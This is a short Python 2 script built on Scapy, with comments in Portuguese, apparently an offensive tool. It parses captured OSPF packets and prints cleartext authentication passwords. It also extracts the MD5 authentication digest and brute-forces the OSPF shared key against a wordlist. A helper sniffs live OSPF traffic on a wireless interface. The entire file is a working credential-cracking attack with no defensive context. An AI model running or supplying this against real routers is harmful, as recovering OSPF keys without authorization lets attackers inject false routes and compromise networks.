from scapy.all import *
import hashlib

# Carregando OSPF
load_contrib('ospf')

def crack(pacote, original):

	# Setando checksum = 0
	if pacote[OSPF_Hdr].chksum != 0x0:
		pacote[OSPF_Hdr].chksum = 0x0

	# Primeiros N bytes do pacote OSPF
	conteudo = str(pacote[OSPF_Hdr])[ : pacote[OSPF_Hdr].len]

	for linha in open('wordlist.txt', 'r'):

		senha = linha.strip()

		# Tratando senha
		if len(senha) < 16:
			senha += '\x00' * (16 - len(senha))
		else:
			senha = senha[ : 16]

		# Criando hash
		md5 = hashlib.md5()
		md5.update(conteudo + senha)
		if original == md5.hexdigest():
			print '[+] Senha encontrada: %s' % senha

def listar(path):
	
	# Carregando a lsita de pacotes
	pacotes = rdpcap(path)

	# Listando Pacotes
	for pacote in pacotes:

		# Apenas pacotes OSPF
		if OSPF_Hdr in pacote:
	
			print pacote.summary()
			getAuth(pacote)

def getAuth(pacote):

	if pacote.authtype == 0:

		print '[+] Sem criptografia'

	elif pacote.authtype == 1:

		senha = "%x" % pacote.authdata
		print '[+] Senha em texto claro: %s' % senha.decode("hex")

	else:

		hdr = pacote[OSPF_Hdr]
        	md5 = ""

        	for c in str(hdr)[hdr.len : hdr.len + 16]:

                	md5 += "%02x" % ord(c)

		print '[+] Hash (MD5): %s' % md5
		crack(pacote, md5)		

def capturar(pacote):

	if OSPF_Hdr in pacote:
		
		print pacote.summary()

def sniffar():

	print "[*] Capturando pacotes OSPF"
	sniff(iface = 'wlan0', prn = capturar)

listar('ospf_md5.pcap')

